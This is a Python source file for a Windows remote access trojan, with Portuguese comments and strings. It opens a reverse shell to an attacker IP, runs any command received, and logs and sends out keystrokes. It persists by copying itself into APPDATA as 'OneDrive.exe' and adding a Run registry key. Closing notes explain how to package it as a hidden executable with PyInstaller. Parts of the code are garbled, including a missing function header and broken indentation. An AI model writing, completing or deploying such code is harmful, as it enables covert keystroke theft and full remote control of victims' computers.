from datetime import datetime
import threading
import socket
from time import sleep
import subprocess
import os
import sys
import winreg
from pynput import keyboard
import shutil

IP = "coloque o ip"
PORT = 443

PROGRAM_NAME = "OneDrive"
REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
MAX_BUFFER_SIZE = 300

keylog_buffer = []
buffer_lock = threading.Lock()
buffer_auto_send_pending = False
keylogger_active = False
listener = None

def format_key(key):
try:
return key.char
except AttributeError:
special_key = {
keyboard.Key.space: ' ',
keyboard.Key.enter: '[ENTER]\n',
keyboard.Key.tab: '[TAB]\n',
keyboard.Key.backspace: '[BACKSPACE]\n',
keyboard.Key.shift: '',
keyboard.Key.ctrl: '',
keyboard.Key.alt: '',
}
return special_key.get(key, f'[{key.name.upper()}]')

def on_press(key):
global keylog_buffer, buffer_auto_send_pending

formatted = format_key(key)
if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
keylog_buffer.append(formatted)

if len(keylog_buffer) > MAX_BUFFER_SIZE:
buffer_auto_send_pending = True

def get_key_name(key):
special_key = {
keyboard.Key.space: " ",
keyboard.Key.enter: "\n",
keyboard.Key.backspace: "[BACKSPACE]"
}

if key in special_key:    
    return special_key[key]    

if hasattr(key, "char") and key.char:    
    return key.char    

if hasattr(key, "name"):    
    return f'[{key.name.upper()}]'    

return "[UNKNOWN]"

if not keylog_buffer:
return '[i] keylog buffer is empty'

timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
data = f"[+] keylog captured at{timestamp}:\n{''.join(keylog_buffer)}"
keylog_buffer = []

return data

def start_keylogger():
global keylogger_active, listener

if keylogger_active:
return '[i] ta ativo'

listener = keyboard.Listener(on_press=on_press)
listener.start()
keylogger_active = True
return"[+] keylogger started"

def stop_keylogger():
global keylogger_active, listener

if not keylogger_active:
return '[i] keylogger not running'

if listener:
listener.stop()

keylogger_active = False
return '[+]keylogger stoped'

def copia_do_sistema():
try:
appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
if not os.path.exists(appdata_path):
os.makedirs(appdata_path)

arquivo_atual = sys.executable
destino = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')

if os.path.abspath(arquivo_atual) != os.path.abspath(destino):      
        shutil.copy2(arquivo_atual, destino)      
        return destino      
return arquivo_atual

except Exception as e:
print(f'[-] error copying file: {e}')
return sys.executable

def adicionar_o_registro(file_path):
try:
key = winreg.OpenKey(
winreg.HKEY_CURRENT_USER,
REGISTRY_KEY_PATH,
0,
winreg.KEY_SET_VALUE
)

winreg.SetValueEx(
key,
PROGRAM_NAME,
0,
winreg.REG_SZ,
file_path,
)

winreg.CloseKey(key)      
return True

except Exception as e:
return False

def check_persistence():
try:
key = winreg.OpenKey(
winreg.HKEY_CURRENT_USER,
REGISTRY_KEY_PATH,
0,
winreg.KEY_READ
)

value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
winreg.CloseKey(key)
return True

except FileNotFoundError:
return False
except Exception as e:
print(f"[-] erro de persistencia: {e}")
return False

def setup_persistence():
try:
if check_persistence():
return

pasta_persistencia =  copia_do_sistema()
adicionar_o_registro(pasta_persistencia)

except Exception as e:
print(f"[-] erro de persistencia: {e}")
return False

def connect(ip, port):
try:
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((ip, port))
c.send("[#] client connect\n".encode())
return c
except Exception as e:
print(f"[!] Connection error: {e}")

def Listen(c):
global buffer_auto_send_pending

try:
while True:
if buffer_auto_send_pending:
data = get_keylog_data()
c.send(f"[AUTO-SENDING] {data}\n[AUTO-SENDING]\n".encode())
buffer_auto_send_pending = False

c.settimeout(0.5)      

    try:      
        data = c.recv(1024).decode().strip()      
        if data == "/exit":      
            return      
        else:      
            cmd(c, data)      


    except socket.timeout:      
         continue

except Exception as e:
print(f"[!] Listen function error: {e}")

def cmd(c, data):
try:
if data.startswith("cd "):
os.chdir(data[3:].strip())
c.send(b'[i] directory changed\n')
return

elif data == '/persistence status':
if check_persistence():
c.send(f'[+] persistencia status:\n\t[i] Path: {sys.executable}\n\t[i] chave de registro: {REGISTRY_KEY_PATH}\n\t[i] Name:{PROGRAM_NAME}\n\n'.encode())
return
else:
c.send(b"[-] Persistence Status: Fail\n\n")
return

elif data == "/persistence setup":      
        setup_persistence()      
        c.send(b'[+] Don\n\n')      
        return      

elif data == "/keylog start":      
    response = start_keylogger()      
    c.send(response.encode()+ b"\n\n")      
    return      
      
elif data == "/keylog stop":      
    response = stop_keylogger()      
    c.send(response.encode()+ b"\n\n")       
    return      

elif data == "/keylog status":      
    status = "Running" if keylogger_active else "Stopped"      
    buffer_size = len(keylog_buffer)      
    response = f"[i] Keylogger Status: {status}\n[i] Buffer: {buffer_size} keys"      
    c.send(response.encode() + b"\n\n")      
    return      
      
elif data == "/keylog dump":      
    response = get_keylog_data()      
    c.send(response.encode() + b"\n\n")      
    return      
      
else:      
    p = subprocess.Popen(      
        data,      
        shell=True,      
        stdin=subprocess.PIPE ,      
        stderr=subprocess.PIPE,      
        stdout=subprocess.PIPE      
    )      
    output = p.stdout.read() + p.stderr.read()      
    if output:      
        c.send(output + b"\n")      
    else:      
        c.send(b"[+] command executed\n")

except Exception as e:
print(f"CMD function error: {e}")

if name == main:
try:
setup_persistence()

while True:
client = connect(IP, PORT)
if client:
Listen(client)
else:
sleep(5)
sock = None
finally:
if sock is not None:
sock.close()

except KeyboardInterrupt:
print("[!] program stopped by the user")

except Exception as error:
print(f"[!] main connection: {error}")

pip install pyinstaller para instalar o .exe;

pyinstaller -F --clean -w;

intale tudo no terminal e nao execute o .exe key;
